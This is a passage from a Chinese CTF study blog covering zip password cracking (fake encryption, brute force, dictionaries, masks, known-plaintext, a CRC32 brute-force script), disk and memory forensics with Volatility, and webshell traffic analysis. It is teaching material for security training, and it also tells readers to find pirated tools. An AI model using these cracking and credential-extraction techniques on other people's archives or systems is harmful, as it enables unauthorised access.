                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240922235342789.png"
                      alt="image-20240922235342789"
                ></p>
<p>真加密，即<strong>压缩源文件数据区的通用位标记</strong>为<code>0090</code>，<strong>压缩源文件目录区的通用位标记</strong>也为<code>0090</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240923001101101.png"
                      alt="image-20240923001101101"
                ></p>
<p>判断是否为伪加密，将<strong>压缩源文件目录区的通用位标记</strong>改为偶数即可，改完后能够解压文件并不需要密码就是伪加密。</p>
<p>或者将压缩包放在linux系统，伪加密是可以直接打开的。</p>
<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3>
  <div class="note p-4 mb-4 rounded-small info">
    <p>通过枚举的方式将所有可能的情况都进行一遍尝试</p>

  </div>


  <div class="note p-4 mb-4 rounded-small warning">
    <p>工具内容较多，这里只演示其中一小部分</p>

  </div>

<p>范围中可以指定每位的具体字符是什么</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240923004327752.png"
                      alt="image-20240923004327752"
                ></p>
<p>长度中可以指定口令长度</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240923004410091.png"
                      alt="image-20240923004410091"
                ></p>
<p>也可以指定自己的字典</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240923004420356.png"
                      alt="image-20240923004420356"
                ></p>
<p>以及后面会遇到的明文恢复</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240923004452161.png"
                      alt="image-20240923004452161"
                ></p>
<p>下面是一个恢复成功的例子</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240923004312436.png"
                      alt="image-20240923004312436"
                ></p>
<h3 id="字典破解"><a href="#字典破解" class="headerlink" title="字典破解"></a>字典破解</h3>
  <div class="note p-4 mb-4 rounded-small info">
    <p>若题目中给我了一些对密码的提示，可以用自己建立的字典进行破解</p>

  </div>

<p>这里用是<a class="link"   href="https://www.crsky.com/soft/137697.html#down" >superdic <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>生成字典</p>
<p>假设场景：密码长度为7，且前3位为abc（先生成再修改）</p>
<p>选择每一位需要的字符</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240923005349351.png"
                      alt="image-20240923005349351"
                ></p>
<p>选择每一个密码前插入字符串</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240923005417618-1727024058711-1.png"
                      alt="image-20240923005417618"
                ></p>
<p>选择保存路径和密码长度</p>
<blockquote>
<p>这里应该选择4位，因为我们生成了4位，然后在这些的前面加上abc，而不是直接生成了abc一起的7位</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240923005519607.png"
                      alt="image-20240923005519607"
                ></p>
<p>开始生成字典，会弹出生成的字典大小（太大不建议直接生成）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240923005645268.png"
                      alt="image-20240923005645268"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240923005718226.png"
                      alt="image-20240923005718226"
                ></p>
<p>然后用该字典破解压缩包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240923010020435.png"
                      alt="image-20240923010020435"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240923010104947.png"
                      alt="image-20240923010104947"
                ></p>
<h3 id="掩码破解"><a href="#掩码破解" class="headerlink" title="掩码破解"></a>掩码破解</h3>
  <div class="note p-4 mb-4 rounded-small info">
    <p>知道了密码的其中几位，可以构造将某几位写上，其他几位以掩码的形式生成字典并进行破解</p>

  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240923125837381.png"
                      alt="image-20240923125837381"
                ></p>
<h3 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h3>
  <div class="note p-4 mb-4 rounded-small info">
    <p>若能得到压缩包中的一个被加密的文件，通过相同的压缩方式将压缩后的与有密码的压缩文件进行对比，找出两个文件的不同点，就能得到我们的key了。</p>
<p>或一直某单一文件的至少12字节的内容也可以进行明文攻击。</p>

  </div>


  <div class="note p-4 mb-4 rounded-small red">
    <p>明文对应文件的加密算法必须是ZipCrypto Store或者是ZipCrypto Deflate算法</p>

  </div>

<blockquote>
<p>这里没有具体题目案例，我套用的网图作演示</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/bc43d4b48fe054d4aa88783b20e23988.png"
                      alt="在这里插入图片描述"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/edac83949a5d0753da1be73fa8dd4b6c.png"
                      alt="在这里插入图片描述"
                ></p>
<p>拿到加密秘钥就可以破解了</p>
<h3 id="CRC32碰撞"><a href="#CRC32碰撞" class="headerlink" title="CRC32碰撞"></a>CRC32碰撞</h3>
  <div class="note p-4 mb-4 rounded-small info">
    <p>CRC32，即循环冗余检验，每一个CRC32都对应不同的内容，若是知道CRC32就可以反推枚举文件内容了，但如果文件内容过大，这种方法就失效了</p>

  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240923160947718.png"
                      alt="image-20240923160947718"
                ></p>
<p>可以使用开源小工具<a class="link"   href="https://github.com/AabyssZG/CRC32-Tools" >CRC32-Tools <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（目前基本只支持1-4Bytes的文件）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240923154832889.png"
                      alt="image-20240923154832889"
                ></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python CRC32-Tools.py -4 atta.zip</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240923160715580.png"
                      alt="image-20240923160715580"
                ></p>
<p>也可以自己编写小脚本</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">printable = string.printable</span><br><span class="line">crc32 = <span class="number">0x6526b899</span>		<span class="comment">#文件的crc32码</span></span><br><span class="line">sign = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(printable, repeat=<span class="number">4</span>):	<span class="comment">#生成4位数字典</span></span><br><span class="line">    s = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="keyword">if</span> crc32 == binascii.crc32(s.encode()):</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line">        sign = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> sign == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>ctf</category>
        <category>data</category>
        <category>misc</category>
      </categories>
      <tags>
        <tag>data</tag>
        <tag>ctf</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>取证分析</title>
    <url>/2024/09/25/ctf/data/misc/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="取证分析"><a href="#取证分析" class="headerlink" title="取证分析"></a>取证分析</h1><p>通过分析计算机系统运行产生的记录内容，对其进行复现从而实现取证</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里会提供一些来自buuctf的案例</p>
<blockquote>
<p>这章的WP之后再写，先偷个懒(๑•́ ₃•̀๑) </p>
</blockquote>
<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2>
  <div class="note p-4 mb-4 rounded-small warning fa-solid icon-padding">
    <i class="note-icon fa-solid fa-circle-exclamation"></i><p>提供的工具若未破解或链接已挂，请自行搜索破解版使用</p>

  </div>

<p><a class="link"   href="https://softmall.net/apps/1498#google_vignette" >TrIDNet <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 文件识别工具</p>
<p><a class="link"   href="https://www.diskgenius.cn/download.php" >DiskGenius <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 磁盘管理与数据恢复工具（windows）</p>
<p><a href="">ext3grep</a> 恢复工具（kali-ext3）– apt install ext3grep</p>
<p><a href="">extundelete</a> 恢复工具（kali-ext4）– apt install extundelete</p>
<p><a class="link"   href="https://blog.csdn.net/m0_68012373/article/details/127419463#:~:text=%E4%B8%80%EF%BC%8C%E7%AE%80%E4%BB%8B.%20Vola" >volatility <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 基于python的内存取证工具</p>
<p><a class="link"   href="https://www.52pojie.cn/thread-1847614-1-1.html#:~:text=VeraCrypt%E6%98%AF" >VeraCrypt <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 开放源代码磁盘加密软件</p>
<p><a class="link"   href="https://bbs.kafan.cn/thread-460084-1-1.html#:~:text=NtfsStream" >NtfsStreamsEditor 2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> NTFS隐写工具</p>
<h2 id="磁盘取证"><a href="#磁盘取证" class="headerlink" title="磁盘取证"></a>磁盘取证</h2><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><h4 id="磁盘分区"><a href="#磁盘分区" class="headerlink" title="磁盘分区"></a>磁盘分区</h4><p>windows主流为FAT和NEFS（FAT12 -&gt; FAT16 -&gt; FAT32 -&gt; NTFS），linux常见文件系统为Ext2、Ext3、Ext4（EXT2 -&gt; EXT3 -&gt; EXT4)</p>
<p>FAT：文件分配表，记录文件所在位置的表格。FAT文件系统用“簇”作为数据单元，用户文件和目录都存储在簇中。</p>
<p>NTFS：新技术文件系统，是WindowsNT环境的文件系统，一个日志文件系统，保存磁盘写入信息外还会对所有改变保留一份日志。</p>
<p><strong>比较</strong>：NTFS能够很快恢复正常，且不易丢失数据，替代了老式的FAT文件系统。</p>
<p>Ext：Linux扩展文件系统。Ext2被称作索引是文件系统，Ext3&#x2F;Ext4被称作日志文件系统</p>
<h4 id="取证方法"><a href="#取证方法" class="headerlink" title="取证方法"></a>取证方法</h4>
  <div class="note p-4 mb-4 rounded-small info">
    <p>CTF中往往会拿到一个无扩展名或者是和文件系统相关扩展名的文件，可以先通过Linux的file命令或者windows的TrIDNet工具识别文件类型，若是磁盘镜像，基本就是磁盘取证了</p>

  </div>

<p>使用<a class="link"   href="https://softmall.net/apps/1498#google_vignette" >TrIDNet <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>工具识别文件类型</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240925230411889.png"
                      alt="image-20240925230411889"
                ></p>
<p>file命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240925235447304.png"
                      alt="image-20240925235447304"
                ></p>
<p>windows下使用<a class="link"   href="https://www.diskgenius.cn/download.php" >DiskGenius <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>恢复数据（需要恢复的数据是windows环境的）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926002430189.png"
                      alt="image-20240926002430189"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926002449430.png"
                      alt="image-20240926002449430"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926002512057.png"
                      alt="image-20240926002512057"
                ></p>
<blockquote>
<p>可以保存下来查找，也可以直接点击查找（挂载）</p>
</blockquote>
<p>linux下使用ext3grep（ext3）、extundelete（ext4）恢复工具（需要恢复的数据是linux环境的）</p>

  <div class="note p-4 mb-4 rounded-small info">
    <p>Ext3文件系统删除文件其实只是删除了inode节点中的指针，数据仍在block中，重新恢复inode指向即可恢复文件</p>

  </div>

<p><strong>linux的挂载</strong></p>
<h5 id="mount挂载镜像"><a href="#mount挂载镜像" class="headerlink" title="mount挂载镜像"></a>mount挂载镜像</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">mount 文件名 自定义目录		<span class="comment">#挂载镜像</span></span><br><span class="line">umount -a 文件名 			<span class="comment">#取消挂载</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>以下是部分演示</p>
</blockquote>
<h5 id="ext3grep"><a href="#ext3grep" class="headerlink" title="ext3grep"></a>ext3grep</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240925235150517.png"
                      alt="image-20240925235150517"
                ></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ext3grep 文件名 --inode 2 -<span class="built_in">ls</span>	<span class="comment">#从系统根目录开始查找文件，并列出所有课恢复的数据</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926000132282.png"
                      alt="image-20240926000132282"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926000944874.png"
                      alt="image-20240926000944874"
                ></p>
<blockquote>
<p>带有d标志的是已经删除的文件</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ext3grep 文件名 --dump-names |grep <span class="string">&quot;flag&quot;</span>	<span class="comment">#查找被删除文件中过滤的flag文件名</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926000641177.png"
                      alt="image-20240926000641177"
                ></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ext3grep 文件名 --restore-file 目录/文件名	<span class="comment">#恢复删除的文件，并再当前目录下生成一个文件夹存放</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926001322737.png"
                      alt="image-20240926001322737"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926001919046.png"
                      alt="image-20240926001919046"
                ></p>
<h5 id="extundelete"><a href="#extundelete" class="headerlink" title="extundelete"></a>extundelete</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">extundelete 文件名 --restore-all	<span class="comment">#恢复所有被删除的文件</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926004020818.png"
                      alt="image-20240926004020818"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926004120111.png"
                      alt="image-20240926004120111"
                ></p>
<h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2>
  <div class="note p-4 mb-4 rounded-small info">
    <p>内存取证通常是指对计算机等智能设备运行时内存中存储的临时数据进行获取与分析，提取有价值的数据</p>

  </div>

<blockquote>
<p>在CTF比赛中，内存取证往往是提供一个完整的内存镜像，所以说看到提供的附件很大，就可以直接判断是内存取证了</p>
</blockquote>
<p><a class="link"   href="https://blog.csdn.net/m0_68012373/article/details/127419463#:~:text=%E4%B8%80%EF%BC%8C%E7%AE%80%E4%BB%8B.%20Vola" >volatility <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>工具，当遇到扩展名为raw、img、dmp、vmem等时，就可以直接开始使用进行内存取证了</p>
<h3 id="volatility"><a href="#volatility" class="headerlink" title="volatility"></a>volatility</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926012821528.png"
                      alt="image-20240926012821528"
                ></p>
<h4 id="volatility常见参数"><a href="#volatility常见参数" class="headerlink" title="volatility常见参数"></a>volatility常见参数</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Options:</span><br><span class="line">  -h, --<span class="built_in">help</span>            列出所有可用选项及其默认值</span><br><span class="line">                        默认值可以在配置文件中设置</span><br><span class="line">                        (/etc/volatilityrc)</span><br><span class="line">  --conf-file=/home/kali/.volatilityrc</span><br><span class="line">                        基于用户的配置文件</span><br><span class="line">  -d, --debug           调试Volatility</span><br><span class="line">  --plugins=PLUGINS     要使用的其他插件目录（冒号分隔）</span><br><span class="line">  --info                打印所有注册对象的信息</span><br><span class="line">  --cache-directory=/home/kali/.cache/volatility</span><br><span class="line">                        存放缓存文件的目录</span><br><span class="line">  --cache               使用缓存</span><br><span class="line">  --tz=TZ               设置 (Olson) 时区以使用 pytz（如果已安装）或 tzset 显示时间戳</span><br><span class="line">  -f FILENAME, --filename=FILENAME</span><br><span class="line">                        打开图像时使用的文件名</span><br><span class="line">  --profile=WinXPSP2x86</span><br><span class="line">                        要加载的配置文件的名称（使用 --info 查看支持的配置文件列表）</span><br><span class="line">  -l LOCATION, --location=LOCATION</span><br><span class="line">                        从中加载地址空间的 URN 位置</span><br><span class="line">  -w, --write           启用写支持</span><br><span class="line">  --dtb=DTB             DTB 地址</span><br><span class="line">  --<span class="built_in">shift</span>=SHIFT         Mac KASLR 移位地址</span><br><span class="line">  --output=text         以这种格式输出（支持特定于模块，请参阅下面的模块输出选项）</span><br><span class="line">  --output-file=OUTPUT_FILE</span><br><span class="line">                        在此文件中写入输出</span><br><span class="line">  -v, --verbose         详细信息</span><br><span class="line">  -g KDBG, --kdbg=KDBG  指定一个 KDBG 虚拟地址（注意：对于 64 位 Windows 8 及更高版本，这是 KdCopyDataBlock 的地址）</span><br><span class="line">  --force               强制使用可疑配置文件</span><br><span class="line">  -k KPCR, --kpcr=KPCR  指定特定的 KPCR 地址</span><br><span class="line">  --cookie=COOKIE       指定 nt!ObHeaderCookie 的地址（仅适用于 Windows 10）</span><br></pre></td></tr></table></figure></div>

<h4 id="常见插件命令"><a href="#常见插件命令" class="headerlink" title="常见插件命令"></a>常见插件命令</h4><table>
<thead>
<tr>
<th>插件命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>clipboard</td>
<td>提取Windows剪贴板中的内容</td>
</tr>
<tr>
<td>cmdscan</td>
<td>提取执行的命令行历史记录（扫描_COMMAND_HISTORY信息）</td>
</tr>
<tr>
<td><strong>dumpfiles</strong></td>
<td>查看指定文件内容（导出缓存文件）</td>
</tr>
<tr>
<td>envars</td>
<td>显示进程的环境变量</td>
</tr>
<tr>
<td><strong>filescan</strong></td>
<td>提取文件对象（file objects）池信息（扫描文件）</td>
</tr>
<tr>
<td>hashdump</td>
<td>转储内存中的Windows帐户密码哈希(LM&#x2F;NTLM)</td>
</tr>
<tr>
<td><strong>imageinfo</strong></td>
<td>查看&#x2F;识别镜像信息</td>
</tr>
<tr>
<td>mimikatz</td>
<td>提取明文密码</td>
</tr>
<tr>
<td>netscan</td>
<td>查看网络连接状态</td>
</tr>
<tr>
<td>notepad</td>
<td>查看展示的记事本内容</td>
</tr>
<tr>
<td>editbox</td>
<td>查看编辑内容</td>
</tr>
<tr>
<td>pstree</td>
<td>将进程显示为树状列表</td>
</tr>
<tr>
<td>screenshot</td>
<td>获取系统在此刻的截图</td>
</tr>
</tbody></table>
<h4 id="命令实例"><a href="#命令实例" class="headerlink" title="命令实例"></a>命令实例</h4><p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E5%8D%81%E7%AB%A0][10.2.1%20volatility%E4%BB%8B%E7%BB%8D]%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81" >参考题目–[10.2.1 volatility介绍]内存取证 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h5 id="查看-识别镜像信息"><a href="#查看-识别镜像信息" class="headerlink" title="查看&#x2F;识别镜像信息"></a>查看&#x2F;识别镜像信息</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vol.py -f 文件名 imageinfo</span><br><span class="line">vol.py -f Keyboard.raw imageinfo</span><br><span class="line"><span class="comment">#查看/识别镜像信息</span></span><br></pre></td></tr></table></figure></div>

<p><strong>kali</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926013207143.png"
                      alt="image-20240926013207143"
                ></p>
<p><strong>windows</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926013234434.png"
                      alt="image-20240926013234434"
                ></p>
<h5 id="指定镜像版本并filescan扫描文件再过滤输出"><a href="#指定镜像版本并filescan扫描文件再过滤输出" class="headerlink" title="指定镜像版本并filescan扫描文件再过滤输出"></a>指定镜像版本并filescan扫描文件再过滤输出</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vol.py -f 文件名 --profile=镜像版本 filescan | grep <span class="string">&quot;文件名&quot;</span>	</span><br><span class="line">vol.py -f Keyboard.raw --profile=Win7SP1x64 filescan | grep <span class="string">&quot;keyboard&quot;</span>	</span><br><span class="line"><span class="comment">#指定镜像版本并filescan扫描文件再过滤输出</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926013752848.png"
                      alt="image-20240926013752848"
                ></p>
<h5 id="指定镜像版本并dumpfiles指定文件，指定内存中的偏移量并导出到当前文件夹下面的test目录"><a href="#指定镜像版本并dumpfiles指定文件，指定内存中的偏移量并导出到当前文件夹下面的test目录" class="headerlink" title="指定镜像版本并dumpfiles指定文件，指定内存中的偏移量并导出到当前文件夹下面的test目录"></a>指定镜像版本并dumpfiles指定文件，指定内存中的偏移量并导出到当前文件夹下面的test目录</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vol.py -f 文件名 --profile=镜像版本 dumpfiles -Q 偏移量 -D 保存路径</span><br><span class="line">vol.py -f Keyboard.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003d700880 -D ./test</span><br><span class="line"><span class="comment">#指定镜像版本并dumpfiles指定文件，指定内存中的偏移量并导出到当前文件夹下面的test目录</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926014722168.png"
                      alt="image-20240926014722168"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926014933567.png"
                      alt="image-20240926014933567"
                ></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>data</category>
        <category>misc</category>
      </categories>
      <tags>
        <tag>data</tag>
        <tag>ctf</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>流量分析</title>
    <url>/2024/09/23/ctf/data/misc/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><p>通过分析流量数据包找出隐藏flag</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里会提供一些来自buuctf的案例</p>
<blockquote>
<p>这章的WP之后再写，先偷个懒(๑•́ ₃•̀๑) </p>
</blockquote>
<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2>
  <div class="note p-4 mb-4 rounded-small warning fa-solid icon-padding">
    <i class="note-icon fa-solid fa-circle-exclamation"></i><p>提供的工具若未破解或链接已挂，请自行搜索破解版使用</p>

  </div>

<p><a class="link"   href="https://www.wireshark.org/" >wireshark <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 流量抓取工具</p>
<blockquote>
<p>tshark可以用kali自带的，windows也可以进入wireshark目录里面找到tshark.exe用命令行操作</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240925004323525.png"
                      alt="image-20240925004323525"
                ></p>
<p><a class="link"   href="https://sourceforge.net/projects/gnuplot/#:~:text=Download%20gnuplot%20for%20free.%20A%20portable," >gunplot <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 绘图工具</p>
<p><a class="link"   href="https://github.com/giggitygi/UsbMiceDataHacker" >UsbMiceDataHacker <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 自动抓取鼠标流量并绘图（不太好用）（可能需要kali）</p>
<p><a class="link"   href="https://github.com/WangYihang/USB-Mouse-Pcap-Visualizer" >USB-Mouse-Pcap-Visualizer <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 生成.csv文件并在线绘图（强烈推荐）</p>
<p><a class="link"   href="https://github.com/WangYihang/UsbKeyboardDataHacker" >UsbKeyboardDataHacker <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 自动抓取键盘流量并转换为字符 （需要kali）</p>
<h2 id="Web流量分析"><a href="#Web流量分析" class="headerlink" title="Web流量分析"></a>Web流量分析</h2><h3 id="HTTP流量分析"><a href="#HTTP流量分析" class="headerlink" title="HTTP流量分析"></a>HTTP流量分析</h3>
  <div class="note p-4 mb-4 rounded-small info">
    <p>由于http是明文传输数据，所以能够直接查找到数据报明文内容</p>

  </div>

<p>有些数据可能是以图片或者压缩包的形式传递的，可以通过“导出流”提取出文件再进一步分析</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923171605060.png"
                      alt="image-20240923171605060"
                ></p>
<h3 id="webshell流量分析"><a href="#webshell流量分析" class="headerlink" title="webshell流量分析"></a>webshell流量分析</h3>
  <div class="note p-4 mb-4 rounded-small info">
    <p>webshell是进行网站攻击的一种恶意攻击脚本环境，会识别webshell流量可以有效防止黑客攻击</p>

  </div>

<p>攻击者一般会对自己的webshell进行变形，在保证其功能的前提下确保自己的webshell不会被查杀，从而达到流量混淆的目的</p>
<p>下面是一个案例的截取<a href="/2024/09/23/ctf/writeup/misc/buuctf/webshell%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="webshell混淆流量分析*">题目WP在这里</a></p>
<p><img  
                     lazyload
